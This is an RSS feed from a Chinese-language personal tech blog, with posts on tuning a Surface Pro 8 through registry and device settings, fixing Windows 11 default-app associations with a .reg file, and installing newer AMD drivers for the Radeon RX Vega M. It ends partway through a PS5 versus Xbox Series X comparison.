@@ -1,0 +1,3711 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+	xmlns:georss="http://www.georss.org/georss"
+	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+	>
+
+<channel>
+	<title>Coxxs</title>
+	<atom:link href="https://dev.moe/feed" rel="self" type="application/rss+xml" />
+	<link>https://dev.moe</link>
+	<description></description>
+	<lastBuildDate>Wed, 05 Jan 2022 12:31:42 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.8.3</generator>
+
+<image>
+	<url>https://dev.moe/wp-content/uploads/2015/11/cropped-0e9d3ee98a13c72bf9e698bd46214bb7-32x32.png</url>
+	<title>Coxxs</title>
+	<link>https://dev.moe</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+<site xmlns="com-wordpress:feed-additions:1">66418562</site>	<item>
+		<title>Surface Pro 8 体验优化</title>
+		<link>https://dev.moe/2507</link>
+					<comments>https://dev.moe/2507#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Fri, 17 Dec 2021 19:02:22 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2507</guid>
+
+					<description><![CDATA[<p>Windows 11 大刀阔斧改进了触屏体验，还支持了原生 Android 模拟，也让我想再次尝试一次支持触摸<a class="more-link" href="https://dev.moe/2507">继续阅读<span class="screen-reader-text">"Surface Pro 8 体验优化"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2507">Surface Pro 8 体验优化</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>Windows 11 大刀阔斧改进了触屏体验，还支持了原生 Android 模拟，也让我想再次尝试一次支持触摸的 Windows 二合一设备。正赶上 Surface Pro 8 发布，8 代抛弃掉了用了 6 年的大黑边模具，用上了 13&#8221; 120Hz 高刷屏以及目前最强的 Intel 核芯显卡 Iris Xe。趁着发布后的优惠期，砍掉了一部分溢价，于是下决心剁手了一台。</p>
+
+
+
+<p>机器到手整体还算满意，不过毕竟是 Microsoft 出品，还是有不少细节问题。但同时作为 Windows 机器，软件上的问题通常是能动手解决的。</p>
+
+
+
+<span id="more-2507"></span>
+
+
+
+<h2>风扇</h2>
+
+
+
+<p>Surface Pro 8 全系列都加入了风扇（此前 Surface Pro 5 以来 Core i5 及以下处理器版本是无风扇设计）。我的 i5 型号在仅浏览静态网页、播放硬解视频时，风扇一般不会运作。但一旦开始运作，还是有些烦人的。通过限制 CPU Turbo Boost，可以大幅降低风扇运作的概率。</p>
+
+
+
+<p>我们需要首先打开被 Microsoft 隐藏的最大处理器状态（Maximum processor state）设置：</p>
+
+
+
+<blockquote class="wp-block-quote"><p>打开注册表，导航至 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\bc5038f7-23e0-4960-96da-33abaf5935ec</code>，将 <code>Attributes</code> 设置为 2。</p></blockquote>
+
+
+
+<p>修改后，在电源选项中就可以设置最大 CPU 频率了。我们可以新建一个名为「静音」的电源计划，在其中限制 CPU 频率，日常使用时也方便来回切换电源计划。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/12/powerplan.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/12/powerplan-1024x529.png" alt="" class="wp-image-2509" width="637" height="328" srcset="https://dev.moe/wp-content/uploads/2021/12/powerplan-1024x529.png 1024w, https://dev.moe/wp-content/uploads/2021/12/powerplan-300x155.png 300w, https://dev.moe/wp-content/uploads/2021/12/powerplan-768x397.png 768w, https://dev.moe/wp-content/uploads/2021/12/powerplan-1536x794.png 1536w, https://dev.moe/wp-content/uploads/2021/12/powerplan-2048x1058.png 2048w, https://dev.moe/wp-content/uploads/2021/12/powerplan-1568x810.png 1568w" sizes="(max-width: 637px) 100vw, 637px" /></a></figure></div>
+
+
+
+<p>设置为 99% 即为关闭 Turbo Boost，CPU 频率不会超过基准频率（Base Speed）。继续降低则可以进一步限制频率。</p>
+
+
+
+<p>此外，在插入电源时，Surface Pro 8 的风扇运转会比使用电池激进不少。我通过更改注册表，尝试将插电源时的电源策略改为使用电池的电源策略，但并不确定是否实际有效。大家可以尝试看看，欢迎评论反馈。</p>
+
+
+
+<blockquote class="wp-block-quote"><p>打开注册表，导航至 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\bfeba2e4-fdcc-41d9-93f4-3f6991c1f730\a4a0ab02-11f1-4584-bc52-cbb98eabdb0b\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e</code>，将 <code>ACSettingIndex</code> 设置为 2。</p></blockquote>
+
+
+
+<p>修改后，可能需要在控制面板中改变一下 Power Mode，或插拔电源，使设置生效。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/12/image-1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/12/image-1-1024x310.png" alt="" class="wp-image-2527" width="618" height="187" srcset="https://dev.moe/wp-content/uploads/2021/12/image-1-1024x310.png 1024w, https://dev.moe/wp-content/uploads/2021/12/image-1-300x91.png 300w, https://dev.moe/wp-content/uploads/2021/12/image-1-768x233.png 768w, https://dev.moe/wp-content/uploads/2021/12/image-1.png 1353w" sizes="(max-width: 618px) 100vw, 618px" /></a><figcaption>新版控制面板中的 Power mode，一般设置为 Recommended 即可</figcaption></figure></div>
+
+
+
+<p>遗憾的是 Surface 似乎未对 Windows 暴露风扇接口，无法直接对风扇控制启停及调速。有兴趣的小伙伴可以逆向研究一下 Surface SMF Client Driver 等，其中似乎有管理 EC 集成控制器（Surface 称之为 Surface System Aggregator）电源策略的接口。</p>
+
+
+
+<p>此外，由于 <a href="https://plundervolt.com/" target="_blank" rel="noreferrer noopener">Plundervolt</a> 漏洞，过去常用的降压降温法，在 11 代移动处理器是行不通的，同时 Microsoft 也已经通过固件更新限制了老款 Surface 的降压。</p>
+
+
+
+<p>以上方法均只适用于轻度使用，实测观看 Gawr Gura 的直播时，如果打开一秒刷 4、5 行的直播评论窗口，风扇几分钟内就会开始运转。如果想要用 Pro 8 玩游戏，还是自备一个降噪耳机吧。</p>
+
+
+
+<h2>屏幕</h2>
+
+
+
+<p>从 Surface Pro 5 开始，微软会把屏幕校色到有些偏黄。过去可以通过更改色彩配置来恢复屏幕原本的色温，但这招在新款的 Surface 上不灵了。</p>
+
+
+
+<p>新款 Surface 中，可以在设备管理器（Device Manager）中禁用 Surface 的调色。</p>
+
+
+
+<ol><li>保存并关闭所有程序，打开设备管理器（Device Manager）</li><li>显示器（Monitors）-&gt;  Surface Panel</li><li>右键 -&gt; Update Driver -&gt; Browse my computer for drivers -&gt; Let me pick from a list of available drivers on my computer</li><li>选择 Generic PnP Monitor（通用即插即用监视器），保存</li><li>此时屏幕背光可能会被关闭，且亮度暂时无法调节，重启电脑即可恢复正常</li></ol>
+
+
+
+<h2>蓝牙断连</h2>
+
+
+
+<p>在使用我的蓝牙鼠标时，只要几秒不动鼠标，再次移动时鼠标就会延迟半秒才有反应。一番折腾，果然是蓝牙省电功能干的好事。</p>
+
+
+
+<ol><li>打开设备管理器（Device Manager）</li><li>蓝牙（Bluetooth） -&gt; Intel(R) Wireless Bluetooth(R)</li><li>右键 -&gt; 属性 -&gt; 电源管理（Power Managerment）</li><li>取消勾选「允许计算机关闭此设备以节省电量（Allow the computer to turn off this device to save power）」</li></ol>
+
+
+
+<p>关闭省电功能后，问题立即解决。</p>
+
+
+
+<h2>Wi-Fi 断流</h2>
+
+
+
+<p>在用远程串流这类对网络质量敏感的应用时，有时会发现声音画面隔几秒种会停一下。通过 PingPlotter 间隔 0.05 秒对本地网络进行测试，发现无线网络确实存在波动。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/12/image.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/12/image-1024x246.png" alt="" class="wp-image-2510" width="679" height="163" srcset="https://dev.moe/wp-content/uploads/2021/12/image-1024x246.png 1024w, https://dev.moe/wp-content/uploads/2021/12/image-300x72.png 300w, https://dev.moe/wp-content/uploads/2021/12/image-768x184.png 768w, https://dev.moe/wp-content/uploads/2021/12/image.png 1213w" sizes="(max-width: 679px) 100vw, 679px" /></a><figcaption>中间一段为关闭了无线网卡的 MIMO power save mode，此时断流消失</figcaption></figure></div>
+
+
+
+<p>打开设备管理器，调整 AX201 省电相关的设置后，问题解决。</p>
+
+
+
+<ol><li>打开设备管理器（Device Manager）</li><li>网络适配器（Network adapters） -&gt; Intel(R) Wi-Fi 6 AX201 160MHz</li><li>右键 -&gt; 属性 -&gt; 高级（Advanced）</li><li>将 MIMO Power Save Mode 设置为 No SMPS</li></ol>
+
+
+
+<p>其他设置的含义可查阅 <a href="https://www.intel.com/content/www/us/en/support/articles/000005585/wireless/legacy-intel-wireless-products.html" target="_blank" rel="noreferrer noopener">Intel 官网</a>，可以根据自己的网络情况进行调整。</p>
+
+
+
+<h2>漏电</h2>
+
+
+
+<p>似乎只要是金属外壳、二孔插头的笔记本电脑，外壳漏电总是无法避免的。充电时，用手触摸 Surface Pro 8 的背盖，会有一些微微的麻手感。不过日常也不怎么会触摸后背，即使摸着也不太影响使用。</p>
+
+
+
+<p>如果一定要解决的话，可以利用 Surface Pro 8 的 USB-C 口。经实测使用带接地的三孔插头的电源适配器，插入 USB-C 口充电即可解决该问题。</p>
+
+
+
+<h2>Windows 11</h2>
+
+
+
+<p>对我而言，Windows 11 最讨厌的应该就是双层的上下文菜单，以及不支持拖曳打开应用的任务栏。这些「多点击一次」的设计频频打断思考，降低使用效率。当然，被惹恼的并不只有我，熟悉系统的第三方开发者已经发布了不少能完美解决问题的软件，还附带了更多好用的功能及美化。</p>
+
+
+
+<p><a href="https://www.startallback.com/" target="_blank" rel="noreferrer noopener">StartAllBack</a>（收费）<br><a href="https://github.com/valinet/ExplorerPatcher" target="_blank" rel="noreferrer noopener">ExplorerPatcher</a></p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/2507">Surface Pro 8 体验优化</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2507/feed</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2507</post-id>	</item>
+		<item>
+		<title>Windows 11 无法更改文件默认打开方式修复</title>
+		<link>https://dev.moe/2488</link>
+					<comments>https://dev.moe/2488#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Sat, 28 Aug 2021 15:13:08 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2488</guid>
+
+					<description><![CDATA[<p>最近遇到个神奇的问题——升级 Windows 11 后，设置里修改 .jpg、.png 等格式默认打开方式的选<a class="more-link" href="https://dev.moe/2488">继续阅读<span class="screen-reader-text">"Windows 11 无法更改文件默认打开方式修复"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2488">Windows 11 无法更改文件默认打开方式修复</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>最近遇到个神奇的问题——升级 Windows 11 后，设置里修改 <code>.jpg</code>、<code>.png</code> 等格式默认打开方式的选项变成了灰色不可用，无法更改默认的图片查看器，只能使用 Windows 默认的 Photos 应用。</p>
+
+
+
+<p>然而，在另一台 Windows 11 电脑上，却没有这样的问题。比对注册表研究后，发现并非是 Windows 的 Bug，而是第三方图片查看器设置默认打开方式时在注册表里主动增加了限制（似乎是为了回避旧版系统的 Bug）。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/08/default.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/08/default-1024x568.png" alt="" class="wp-image-2489" width="501" height="277" srcset="https://dev.moe/wp-content/uploads/2021/08/default-1024x568.png 1024w, https://dev.moe/wp-content/uploads/2021/08/default-300x166.png 300w, https://dev.moe/wp-content/uploads/2021/08/default-768x426.png 768w, https://dev.moe/wp-content/uploads/2021/08/default.png 1207w" sizes="(max-width: 501px) 100vw, 501px" /></a></figure></div>
+
+
+
+<span id="more-2488"></span>
+
+
+
+<p>解决方案如下（保存为 <code>.reg</code> 并打开）：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\AppX43hnxtbyyps62jhe9sqpdzxn1790zetc]
+"NoOpenWith"=-
+[HKEY_CLASSES_ROOT\AppX6eg8h5sxqq90pv53845wmnbewywdqq5h]
+"NoOpenWith"=-
+[HKEY_CLASSES_ROOT\AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h]
+"NoOpenWith"=-
+[HKEY_CLASSES_ROOT\AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt]
+"NoOpenWith"=-
+[HKEY_CLASSES_ROOT\AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg]
+"NoOpenWith"=-</pre>
+
+
+
+<p>比对完注册表，写完 <code>.reg</code> 文件，才发现几天前就有日本人发了一模一样的解决方案 =_,=</p>
+
+
+
+<p>相关阅读：<br><a href="https://srad.jp/comment/4096009" rel="nofollow">https://srad.jp/comment/4096009</a><br><a href="https://winaero.com/prevent-windows-10-from-resetting-your-default-apps/" target="_blank" rel="noreferrer noopener nofollow">https://winaero.com/prevent-windows-10-from-resetting-your-default-apps/</a></p>
+
+
+
+<p><strong>Coxxs</strong></p>
+
+
+
+<blockquote class="wp-block-quote"><p>本文（<a href="https://dev.moe/2488">https://dev.moe/2488</a>）由 Coxxs 原创，转载请注明原文链接。</p></blockquote>
+<p><a rel="nofollow" href="https://dev.moe/2488">Windows 11 无法更改文件默认打开方式修复</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2488/feed</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2488</post-id>	</item>
+		<item>
+		<title>为 Radeon RX Vega M 安装新版驱动</title>
+		<link>https://dev.moe/2459</link>
+					<comments>https://dev.moe/2459#respond</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Fri, 13 Aug 2021 15:41:47 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2459</guid>
+
+					<description><![CDATA[<p>在 AMD 近些年风生水起后， 此前 Intel 和 AMD 合作推出的 i7-8809G 似乎就被双方忽略了<a class="more-link" href="https://dev.moe/2459">继续阅读<span class="screen-reader-text">"为 Radeon RX Vega M 安装新版驱动"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2459">为 Radeon RX Vega M 安装新版驱动</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>在 AMD 近些年风生水起后， 此前 Intel 和 AMD 合作推出的 i7-8809G 似乎就被双方忽略了。i7-8809G 融合了 Intel 的第 7 代 CPU 及 Radeon RX Vega M GPU，让电脑（NUC）在较小的体积下能够获得不错的性能。遗憾的是，推出仅 2 年后，AMD 就停止了 RX Vega M 的支持，驱动版本停留在了 20.2.2（2020 年 3 月）。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00-1024x743.png" alt="" class="wp-image-2461" width="593" height="429" srcset="https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00-1024x743.png 1024w, https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00-300x218.png 300w, https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00-768x557.png 768w, https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00-1536x1114.png 1536w, https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00-1568x1137.png 1568w, https://dev.moe/wp-content/uploads/2021/08/Snipaste_2021-08-13_21-30-00.png 1748w" sizes="(max-width: 593px) 100vw, 593px" /></a><figcaption>安装 20.2.2 以上版本的驱动会弹出“不受支持”</figcaption></figure></div>
+
+
+
+<span id="more-2459"></span>
+
+
+
+<p>由于相关代码并未从新版驱动中删除，有大神<a href="https://github.com/leogcry22/Hades-VegaM">魔改了新版的驱动</a>，使其继续支持 RX Vega M。然而，自 Windows 7 开始，微软强制驱动需签名，且这项政策随着系统版本迭代越来越严格。修改驱动显然会破坏驱动签名，而关闭驱动强制签名又会影响系统安全。</p>
+
+
+
+<p>有没有其他方案呢？查找资料的过程中，发现其实可以直接通过设备管理器安装新版驱动，且无需关闭驱动强制签名。方法很简单，但该方法会加载类似型号的驱动，存在一定风险，请自行斟酌使用，风险自负。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<h2>安装显卡驱动</h2>
+
+
+
+<ol><li>卸载已安装的 AMD Radeon 驱动</li><li>下载 <a href="https://drivers.amd.com/drivers/Non-WHQL-Radeon-Software-Adrenalin-2020-21.5.1-Win10-64Bit-May6.exe" target="_blank" rel="noreferrer noopener">21.5.1</a>（推荐使用） 或 <a href="https://drivers.amd.com/drivers/radeon-software-adrenalin-2020-21.4.1-win10-64bit-apr20.exe" target="_blank" rel="noreferrer noopener">21.4.1</a>（WHQL 认证） 或 <a href="https://forums.guru3d.com/threads/amd-radeon-software-uwp.437511/" target="_blank" rel="noreferrer noopener">UWP</a>（最新，但缺少部分功能） 版本驱动</li><li>无需运行，直接以压缩包形式打开（7-zip），解压出 <code>Packages\Drivers</code> 目录</li><li>打开 Device Manager（设备管理器）</li><li>右击 AMD 显卡，Update Driver → Browse my computer for drivers → Let me pick from a list of available drivers on my computer → Have Disk&#8230; → 定位到刚才解压的 <code>Packages\Drivers\Display\WT6A_INF</code> 目录 → 列表中选择 Radeon RX Vega → 继续完成安装</li></ol>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/08/rxvega.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/08/rxvega-1024x819.png" alt="" class="wp-image-2460" width="506" height="404" srcset="https://dev.moe/wp-content/uploads/2021/08/rxvega-1024x819.png 1024w, https://dev.moe/wp-content/uploads/2021/08/rxvega-300x240.png 300w, https://dev.moe/wp-content/uploads/2021/08/rxvega-768x614.png 768w, https://dev.moe/wp-content/uploads/2021/08/rxvega.png 1388w" sizes="(max-width: 506px) 100vw, 506px" /></a></figure></div>
+
+
+
+<h2>安装音频输出驱动</h2>
+
+
+
+<p>为确保音频输出正常，安装显卡驱动后，需要安装音频输出驱动。</p>
+
+
+
+<ol><li><span style="font-size: 1em;">打开 Device Manager（设备管理器）</span> </li><li>Action → Add drivers → 定位到刚才解压的 <code>Packages\Drivers\Audio</code> 目录 → 继续完成安装</li></ol>
+
+
+
+<h2>安装 AMD Radeon Software 控制面板</h2>
+
+
+
+<p>由于未使用安装程序，还需自行安装驱动控制面板。这里直接安装 UWP 版本的面板，简单干净。</p>
+
+
+
+<ol><li>定位到刚才解压的 <code>Packages\Drivers\Display\WT6A_INF\UWPPair</code>（最新版驱动可能无此目录）</li><li>右击 UWPPair.inf → 安装</li><li>现在可以在 Microsoft Store 中直接安装 <a href="https://www.microsoft.com/en-us/p/amd-radeon-software/9nz1bjqn6bhl" target="_blank" rel="noreferrer noopener">AMD Radeon Software</a></li></ol>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>由于最新版官方安装包未包含对应的 UWPPair 文件，会影响驱动控制面板的安装，这里只安装了较新的版本（21.5.1，2021 年 5 月）。此外，由于安装了 Radeon RX Vega，驱动面板多出了不少功能，不过部分新功能可能无法安全运作。</p>
+
+
+
+<p>本文部分参考了<a href="https://community.amd.com/t5/drivers-software/why-was-support-for-quot-radeon-rx-vega-m-gh-graphics-quot/td-p/72639/page/3" target="_blank" rel="noreferrer noopener">此处</a>，在此表示感谢。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/2459">为 Radeon RX Vega M 安装新版驱动</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2459/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2459</post-id>	</item>
+		<item>
+		<title>PS5 Vs. Xbox Series X 对比简评</title>
+		<link>https://dev.moe/2216</link>
+					<comments>https://dev.moe/2216#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Wed, 23 Jun 2021 21:47:43 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2216</guid>
+
+					<description><![CDATA[<p>在“装一台高性能电脑”的梦想渐行渐远后，我拿着原先的预算入手了 PS5 及 Xbox Series X。在媒体<a class="more-link" href="https://dev.moe/2216">继续阅读<span class="screen-reader-text">"PS5 Vs. Xbox Series X 对比简评"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2216">PS5 Vs. Xbox Series X 对比简评</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>在“装一台高性能电脑”的梦想渐行渐远后，我拿着原先的预算入手了 PS5 及 Xbox Series X。在媒体的评测中，他们是本世代最强，都支持 HDMI 2.1 4K 120Hz，也都比上一代更安静。但在实际上手体验一阵子后，感受到两者除各有特色外，也各有一些问题。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-12.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-12-1024x570.png" alt="本世代最强 —— PS5 与 Xbox Series X" class="wp-image-2358" width="519" height="289" srcset="https://dev.moe/wp-content/uploads/2021/06/image-12-1024x570.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-12-300x167.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-12-768x427.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-12-1536x855.png 1536w, https://dev.moe/wp-content/uploads/2021/06/image-12-1568x873.png 1568w, https://dev.moe/wp-content/uploads/2021/06/image-12.png 1689w" sizes="(max-width: 519px) 100vw, 519px" /></a><figcaption>PS5 / Xbox Series X</figcaption></figure></div>
+
+
+
+<p>每位玩家更关注的地方都不尽相同，因此本文会从尽可能多的角度，比较两款机器的各个方面。阅读本文时，可仅阅读自己关注的部分。</p>
+
+
+
+<p>本文写于 2021 年 6 月，文中提及的情况在未来可能已发生变化。</p>
+
+
+
+<p><strong>2021 年 8 月：</strong>更新 Xbox PC 远程游玩、Xbox Series X 系统 UI 分辨率相关信息，以反映已在内测且即将加入的功能。</p>
+
+
+
+<p><strong>2021 年 9 月：</strong> PS5 已通过固件更新新增 NVMe 硬盘扩容支持。</p>
+
+
+
+<span id="more-2216"></span>
+
+
+
+<h2>噪音</h2>
+
+
+
+<p>噪音可以说是上世代 PS4 Pro 主机最大的问题。恰好我的主机放置在电脑桌下，因此对噪音的感受更深。想象一下：在倒映着天空的静谧湖面边，伴随着渲染清晰的画面，只听见断续的虫鸣、玩家的脚步声——以及现实中玩家脚下的喷气式飞机正在起飞 。</p>
+
+
+
+<p>本世代的主机的确解决了喷气式飞机的问题，但也使其他噪音（如啸叫声）更加突出。许多媒体会用分贝值来比较主机的噪音，这并不是很科学。<strong>噪音的定义是令人感觉不悦的声音</strong>。拿刺耳的啸叫声与呼呼的风声举例，即使两者分贝相同，啸叫声会更让人不悦。</p>
+
+
+
+<p>本世代的主机噪音可分为三个部分：<strong>风扇、电源啸叫、光驱读盘</strong>。</p>
+
+
+
+<p>其中光驱读盘的声音几台机器都差不多：仅在游戏安装至硬盘时有噪音，<strong>安装完毕后基本无声</strong>。但如果拿来看蓝光电影，光驱会持续转动，噪音会比专用的蓝光机大一些。</p>
+
+
+
+<p><strong>风扇</strong>及<strong>电源啸叫</strong>就比较复杂了，这里用一个表格直接总结。表格中均为运行大型游戏时的状态。</p>
+
+
+
+<figure class="wp-block-table is-style-stripes"><table><tbody><tr><td></td><td><strong>风扇</strong></td><td><strong>电源啸叫</strong></td><td><strong>评分</strong></td></tr><tr><td>PS4 Pro</td><td><img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f6e9.png" alt="🛩" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br>（后期型号有改进）</td><td>抽奖，部分有啸叫<br>穿透力强</td><td>0/5</td></tr><tr><td>Xbox One X</td><td>风声</td><td>无感知</td><td>3/5</td></tr><tr><td>PS5</td><td>抽奖：<br>不悦噪音，穿透力强（Nidec）<br>微弱风声（Delta / NMB）</td><td>抽奖，部分有<a href="https://www.youtube.com/watch?v=2Kl7EshQPdM" target="_blank" rel="noreferrer noopener">电感啸叫</a><br>（渲染大型场景时）</td><td>2/5</td></tr><tr><td>Xbox Series X</td><td>无感知</td><td>无感知</td><td><strong>4.5/5</strong></td></tr></tbody></table></figure>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-3.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-3.png" alt="这台 Nidec 风扇的 PS5，运行时会发出 180Hz 与 1000Hz 的噪音" class="wp-image-2348" width="566" height="310" srcset="https://dev.moe/wp-content/uploads/2021/06/image-3.png 979w, https://dev.moe/wp-content/uploads/2021/06/image-3-300x164.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-3-768x420.png 768w" sizes="(max-width: 566px) 100vw, 566px" /></a><figcaption>这两条 180Hz 与 1000Hz 的线，将全程陪伴着 PS5 玩家 —— 如果抽中 Nidec 风扇的话</figcaption></figure></div>
+
+
+
+<p>由于 PS5 的风扇抽奖活动过于热烈，淘宝上卖 PS5 风扇的店家已经将价格从几十块涨到了接近￥400。好在更换 PS5 风扇操作简便，也无需戳破保修标签。如果不想抽奖，又很在意噪音，建议在问题解决前，避免购买 PS5。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-14.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-14-1024x694.png" alt="Microsoft 通过添加减震胶的方式，尽可能消除电源啸叫。这很简单粗暴，但也很有效。" class="wp-image-2360" width="544" height="368" srcset="https://dev.moe/wp-content/uploads/2021/06/image-14-1024x694.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-14-300x203.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-14-768x521.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-14.png 1201w" sizes="(max-width: 544px) 100vw, 544px" /></a><figcaption>Xbox 电源内的减震胶，简单粗暴但有效 (<a href="https://www.youtube.com/watch?v=YG0U4I6dSR4&amp;t=392s" target="_blank" rel="noreferrer noopener">Source</a>)</figcaption></figure></div>
+
+
+
+<p><strong>Xbox Series X 则是近几年来最安静的游戏主机</strong>。从电源内部一坨坨的减震胶，也能看出 Microsoft 对噪音控制有多么重视。唯一的遗憾是光驱在播放蓝光电影时并不那么安静。</p>
+
+
+
+<h2>噪音（对他人）</h2>
+
+
+
+<p>很多时候，自己听起来舒爽的声音，对于身边的人却是一种噪音——如果想在学校寝室里玩，或者想在凌晨的家中游玩，就要考虑避免打扰身边的人。</p>
+
+
+
